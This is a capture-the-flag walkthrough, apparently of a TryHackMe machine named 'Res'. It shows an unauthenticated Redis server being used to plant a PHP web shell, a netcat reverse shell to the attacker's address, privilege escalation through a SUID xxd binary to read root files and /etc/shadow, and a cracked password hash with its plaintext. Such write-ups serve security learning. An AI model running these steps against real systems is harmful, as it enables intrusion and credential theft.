> Res

# Nmap

nmap -sC -sV -T4 -Pn -vvv -A -oN nmap/initial $IP

```
80/tcp   open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
6379/tcp open  redis   syn-ack Redis key-value store 6.0.7
```

Looks like Redis server is in place and without authentication🤡. And looking at HackTricks looks like we can create a file if we know the exact location of writable directory.

```
config set dir /var/www/html
config set dbfilename redis.php
set test "<?php phpinfo (); ?>"
save
```

And now accessing `set test "<?php phpinfo (); ?>"` we got php info page. Let's try to get RCE.

Let's change the contents of redis.php to `set test "<?php system($_GET['cmd']); ?>"` and we got command execution. Let's get a shell.

And accessing `http://10.10.153.39/redis.php?cmd=nc%20-e%20/bin/sh%2010.8.107.21%209001`, we got the shell as www-data.

# User.txt

```
thm{red1s_rce_w1thout_credent1als}
```

Let's looks for SUID bits.

find / -perm -u=s -type f 2>/dev/null

```
/bin/ping
/bin/fusermount
/bin/mount
/bin/su
/bin/ping6
/bin/umount
/usr/bin/chfn
/usr/bin/xxd => 🐛
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chsh
```

# Exploit

```
LFILE=/root/root.txt
xxd "$LFILE" | xxd -r
```

# root.txt

```
thm{xxd_pr1v_escalat1on}
```

But still we need local user's password which is in `/etc/shadow`. By using the same steps we got this and now we can crack this to get the password.

`vianka:$6$2p.tSTds$qWQfsXwXOAxGJUBuq2RFXqlKiql3jxlwEWZP6CWXm7kIbzR6WzlxHR.UHmi.hc1/TuUOUBo/jWQaQtGSXwvri0:18507:0:99999:7:::`

john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

```
beautiful1       (?)
```